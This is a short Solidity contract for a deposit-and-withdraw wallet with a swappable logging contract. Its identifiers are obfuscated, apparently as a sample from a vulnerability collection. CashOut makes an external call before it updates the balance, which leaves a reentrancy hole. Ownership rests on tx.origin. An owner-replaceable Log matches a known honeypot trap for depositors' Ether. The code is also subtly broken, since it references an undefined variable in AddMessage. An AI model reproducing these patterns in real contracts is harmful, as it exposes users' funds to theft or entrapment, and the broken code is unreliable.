// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract PrivateDeposit
{
    mapping (address => uint) public _0x4c57f8;

    uint public MinDeposit = 1 ether;
    address public _0xd64d94;

    Log TransferLog;

    modifier _0xca4c53() {
        require(tx.origin == _0xd64d94);
        _;
    }

    function PrivateDeposit()
    {
        _0xd64d94 = msg.sender;
        TransferLog = new Log();
    }

    function _0x0df9ab(address _0x3f0f11) _0xca4c53
    {
        TransferLog = Log(_0x3f0f11);
    }

    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            _0x4c57f8[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _0x25e3eb)
    {
        if(_0x25e3eb<=_0x4c57f8[msg.sender])
        {
            if(msg.sender.call.value(_0x25e3eb)())
            {
                _0x4c57f8[msg.sender]-=_0x25e3eb;
                TransferLog.AddMessage(msg.sender,_0x25e3eb,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Log
{

    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x9aa551,uint _0xcc91c1,string _0xfb4207)
    public
    {
        LastMsg.Sender = _0x9aa551;
        LastMsg.Time = _0x3077f4;
        LastMsg.Val = _0xcc91c1;
        LastMsg.Data = _0xfb4207;
        History.push(LastMsg);
    }
}